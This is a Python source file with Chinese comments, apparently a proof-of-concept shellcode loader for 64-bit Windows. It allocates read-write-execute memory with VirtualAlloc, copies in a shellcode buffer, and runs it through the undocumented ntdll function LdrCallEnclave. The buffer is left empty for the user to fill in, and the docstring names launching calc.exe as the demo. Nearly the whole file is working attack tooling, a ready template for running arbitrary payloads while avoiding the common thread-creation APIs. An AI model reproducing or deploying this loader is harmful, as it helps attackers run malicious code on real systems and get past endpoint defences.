import ctypes
import sys
import platform

def check_environment():
    """确保运行在 64 位 Windows + 64 位 Python"""
    if platform.system() != "Windows":
        print("[!] 此 PoC 仅限 Windows 系统")
        sys.exit(1)
    if platform.machine() not in ("AMD64", "x86_64"):
        print("[!] 需要 64 位 Windows")
        sys.exit(1)
    if ctypes.sizeof(ctypes.c_void_p) != 8:
        print("[!] 需要 64 位 Python 解释器")
        sys.exit(1)
    print("[+] 环境检查通过")

def get_hardcoded_shellcode():
    """
    硬编码的 x64 shellcode，功能：
      - 动态查找 kernel32.dll 基址
      - 解析导出表获取 WinExec 和 ExitThread
      - 调用 WinExec("calc.exe", 1)
      - 调用 ExitThread(0) 干净退出
    """
    shellcode_bytes = bytes([
              #填入你自己的shellcode
    ])
    return shellcode_bytes

def execute_via_enclave(shellcode):
    """
    使用 VirtualAlloc + memmove + LdrCallEnclave 执行 shellcode
    """
    if not shellcode:
        print("[!] 没有可用的 shellcode，退出")
        return False

    size = len(shellcode)
    print(f"[*] 分配 {size} 字节的可执行内存...")

    kernel32 = ctypes.windll.kernel32
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = (ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32)

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    addr = kernel32.VirtualAlloc(
        ctypes.c_void_p(0),
        ctypes.c_size_t(size),
        ctypes.c_uint32(MEM_COMMIT | MEM_RESERVE),
        ctypes.c_uint32(PAGE_EXECUTE_READWRITE),
    )

    if not addr:
        print("[!] VirtualAlloc 失败")
        return False

    print(f"[+] 内存分配成功: 0x{addr:016x}")

    # 拷贝 shellcode
    ctypes.memmove(addr, shellcode, size)
    print("[+] shellcode 已写入内存")

    # 获取 LdrCallEnclave 函数指针
    ntdll = ctypes.WinDLL("ntdll")
    try:
        LdrCallEnclave = ntdll.LdrCallEnclave
        LdrCallEnclave.restype = ctypes.c_uint32
        LdrCallEnclave.argtypes = (
            ctypes.c_void_p,  # Routine
            ctypes.c_uint32,  # Parameter
            ctypes.c_void_p,  # Parameter pointer
        )
    except AttributeError:
        print("[!] 当前系统没有 LdrCallEnclave 函数（可能需要 Windows 10 1809+）")
        return False

    # 定义回调函数类型并包装我们的 shellcode
    RoutineFunc = ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p))
    routine = RoutineFunc(addr)

    print("[*] 调用 LdrCallEnclave 执行 shellcode...")
    try:
        ret = LdrCallEnclave(
            routine,
            ctypes.c_uint32(0),
            ctypes.byref(ctypes.c_void_p()),
        )
        print(f"[+] LdrCallEnclave 返回: {ret}")
        return True
    except Exception as e:
        print(f"[!] LdrCallEnclave 调用失败: {e}")
        return False

def main():
    print("=== Enclave Shellcode Loader PoC ===\n")
    check_environment()

    shellcode = get_hardcoded_shellcode()
    print(f"[+] 已内嵌 {len(shellcode)} 字节的 shellcode \n")

    success = execute_via_enclave(shellcode)
    if success:
        print("\n[*] 执行完成，如果一切正常，将弹出计算器窗口。")
    else:
        print("\n[!] 执行失败，请检查系统环境。")

if __name__ == "__main__":
    main()
